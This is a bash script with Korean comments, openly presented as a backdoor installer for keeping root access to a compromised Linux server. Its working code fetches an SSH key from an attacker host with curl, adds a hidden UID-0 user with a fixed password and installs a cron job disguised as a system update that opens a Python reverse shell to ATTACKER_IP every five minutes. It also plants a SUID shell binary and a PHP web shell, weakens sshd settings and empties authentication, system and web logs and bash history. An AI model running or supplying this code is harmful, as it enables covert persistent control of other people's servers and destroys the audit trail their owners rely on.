#!/bin/bash
#
# 백도어 설치 스크립트 (Root 권한 필요)
# 서버 장악 후 영속성 확보를 위한 백도어 설치
#
# 사용법: sudo bash backdoor_install.sh <ATTACKER_IP>
#

if [ "$EUID" -ne 0 ]; then
    echo "[!] 이 스크립트는 root 권한이 필요합니다."
    echo "    sudo bash backdoor_install.sh <ATTACKER_IP>"
    exit 1
fi

if [ -z "$1" ]; then
    echo "사용법: sudo bash backdoor_install.sh <ATTACKER_IP>"
    echo "예: sudo bash backdoor_install.sh 13.158.67.78"
    exit 1
fi

ATTACKER_IP="$1"

echo "============================================================"
echo "백도어 설치 스크립트"
echo "============================================================"
echo "[*] 타겟: $(hostname)"
echo "[*] 공격자 IP: $ATTACKER_IP"
echo ""

# 백업 디렉토리 생성
BACKUP_DIR="/tmp/.backup_$(date +%s)"
mkdir -p "$BACKUP_DIR"
echo "[*] 백업 디렉토리: $BACKUP_DIR"

echo ""
echo "============================================================"
echo "1. SSH 백도어 설치"
echo "============================================================"

# SSH 디렉토리 확인/생성
if [ ! -d /root/.ssh ]; then
    mkdir -p /root/.ssh
    chmod 700 /root/.ssh
    echo "[+] /root/.ssh 디렉토리 생성"
fi

# 기존 authorized_keys 백업
if [ -f /root/.ssh/authorized_keys ]; then
    cp /root/.ssh/authorized_keys "$BACKUP_DIR/authorized_keys.bak"
    echo "[*] 기존 authorized_keys 백업됨"
fi

# 공격자 공개키 추가
echo "[*] SSH 공개키 추가 중..."

# 공격자 서버에서 공개키 가져오기 시도
SSH_PUB_KEY=$(curl -s http://$ATTACKER_IP:5000/ssh-pubkey 2>/dev/null)

if [ -z "$SSH_PUB_KEY" ]; then
    echo "[!] 공격자 서버에서 공개키를 가져올 수 없습니다."
    echo "[*] 수동으로 공개키를 추가하세요:"
    echo ""
    echo "    1. 공격자 서버에서: cat ~/.ssh/id_rsa.pub"
    echo "    2. 타겟 서버에서: echo '공개키' >> /root/.ssh/authorized_keys"
    echo ""
else
    echo "$SSH_PUB_KEY" >> /root/.ssh/authorized_keys
    chmod 600 /root/.ssh/authorized_keys
    echo "[+] SSH 공개키 추가 완료"
    echo "[*] 테스트: ssh root@$(hostname -I | awk '{print $1}')"
fi

echo ""
echo "============================================================"
echo "2. 새 Root 사용자 생성"
echo "============================================================"

NEW_USER="sysadmin"
NEW_PASS="P@ssw0rd123!"

# 사용자 존재 확인
if id "$NEW_USER" &>/dev/null; then
    echo "[*] 사용자 '$NEW_USER' 이미 존재"
else
    # 사용자 생성
    useradd -m -s /bin/bash -G sudo "$NEW_USER" 2>/dev/null || useradd -m -s /bin/bash "$NEW_USER"
    echo "$NEW_USER:$NEW_PASS" | chpasswd

    # UID를 0으로 변경 (root 권한)
    sed -i "s/^$NEW_USER:x:[0-9]*:/$NEW_USER:x:0:/" /etc/passwd

    echo "[+] 백도어 사용자 생성 완료"
    echo "    사용자: $NEW_USER"
    echo "    비밀번호: $NEW_PASS"
    echo "    UID: 0 (root 권한)"
fi

echo ""
echo "============================================================"
echo "3. Cron 백도어 설치"
echo "============================================================"

CRON_BACKDOOR="/etc/cron.d/system_update"

# Cron job 생성 (매 5분마다 reverse shell 시도)
cat > "$CRON_BACKDOOR" << EOF
# System update checker
*/5 * * * * root /usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])' 2>/dev/null
EOF

chmod 644 "$CRON_BACKDOOR"
echo "[+] Cron 백도어 설치 완료: $CRON_BACKDOOR"
echo "[*] 매 5분마다 $ATTACKER_IP:4444로 연결 시도"

echo ""
echo "============================================================"
echo "4. SUID 백도어 설치"
echo "============================================================"

SUID_BACKDOOR="/usr/local/bin/update-checker"

# SUID 백도어 스크립트 생성
cat > "$SUID_BACKDOOR" << 'EOF'
#!/bin/bash
# System update checker
if [ "$1" = "--shell" ]; then
    /bin/bash -p
else
    echo "Checking for updates..."
    echo "System is up to date."
fi
EOF

chmod 4755 "$SUID_BACKDOOR"
echo "[+] SUID 백도어 설치 완료: $SUID_BACKDOOR"
echo "[*] 실행 방법: $SUID_BACKDOOR --shell"

echo ""
echo "============================================================"
echo "5. 웹 백도어 설치"
echo "============================================================"

# 웹 루트 디렉토리 찾기
WEB_ROOTS=(
    "/var/www/html"
    "/var/www"
    "/usr/share/nginx/html"
    "/opt/lampp/htdocs"
)

WEB_ROOT=""
for dir in "${WEB_ROOTS[@]}"; do
    if [ -d "$dir" ] && [ -w "$dir" ]; then
        WEB_ROOT="$dir"
        break
    fi
done

if [ -n "$WEB_ROOT" ]; then
    WEB_BACKDOOR="$WEB_ROOT/.system.php"

    # PHP 웹쉘 생성
    cat > "$WEB_BACKDOOR" << 'EOF'
<?php
if(isset($_GET['c'])){
    system($_GET['c']);
}
?>
EOF

    chmod 644 "$WEB_BACKDOOR"
    echo "[+] 웹 백도어 설치 완료: $WEB_BACKDOOR"
    echo "[*] 접속: http://$(hostname -I | awk '{print $1}')/.system.php?c=whoami"
else
    echo "[!] 웹 루트 디렉토리를 찾을 수 없습니다."
fi

echo ""
echo "============================================================"
echo "6. SSH 설정 변경"
echo "============================================================"

SSHD_CONFIG="/etc/ssh/sshd_config"

if [ -f "$SSHD_CONFIG" ]; then
    cp "$SSHD_CONFIG" "$BACKUP_DIR/sshd_config.bak"

    # Root 로그인 허용
    sed -i 's/^#*PermitRootLogin.*/PermitRootLogin yes/' "$SSHD_CONFIG"

    # 패스워드 인증 허용
    sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication yes/' "$SSHD_CONFIG"

    # SSH 서비스 재시작
    if command -v systemctl &> /dev/null; then
        systemctl restart sshd 2>/dev/null || systemctl restart ssh 2>/dev/null
    else
        service sshd restart 2>/dev/null || service ssh restart 2>/dev/null
    fi

    echo "[+] SSH 설정 변경 완료"
    echo "    - PermitRootLogin: yes"
    echo "    - PasswordAuthentication: yes"
else
    echo "[!] $SSHD_CONFIG 파일을 찾을 수 없습니다."
fi

echo ""
echo "============================================================"
echo "7. 로그 정리"
echo "============================================================"

# 로그 파일들 정리
LOG_FILES=(
    "/var/log/auth.log"
    "/var/log/secure"
    "/var/log/messages"
    "/var/log/syslog"
    "/var/log/apache2/access.log"
    "/var/log/nginx/access.log"
    "/root/.bash_history"
    "/home/*/.bash_history"
)

echo "[*] 로그 정리 중..."
for log in "${LOG_FILES[@]}"; do
    if [ -f "$log" ]; then
        cp "$log" "$BACKUP_DIR/$(basename $log).bak" 2>/dev/null
        > "$log"  # 로그 파일 비우기
    fi
done

# History 정리
history -c
echo "[+] 로그 정리 완료"

echo ""
echo "============================================================"
echo "백도어 설치 완료!"
echo "============================================================"
echo ""
echo "설치된 백도어:"
echo ""
echo "1. SSH 백도어"
echo "   ssh root@$(hostname -I | awk '{print $1}')"
echo ""
echo "2. 백도어 사용자"
echo "   사용자: $NEW_USER"
echo "   비밀번호: $NEW_PASS"
echo "   ssh $NEW_USER@$(hostname -I | awk '{print $1}')"
echo ""
echo "3. Cron 백도어"
echo "   매 5분마다 $ATTACKER_IP:4444로 연결"
echo "   리스너: nc -lvnp 4444"
echo ""
echo "4. SUID 백도어"
echo "   $SUID_BACKDOOR --shell"
echo ""
if [ -n "$WEB_ROOT" ]; then
echo "5. 웹 백도어"
echo "   http://$(hostname -I | awk '{print $1}')/.system.php?c=id"
echo ""
fi
echo "백업 위치: $BACKUP_DIR"
echo ""
echo "============================================================"
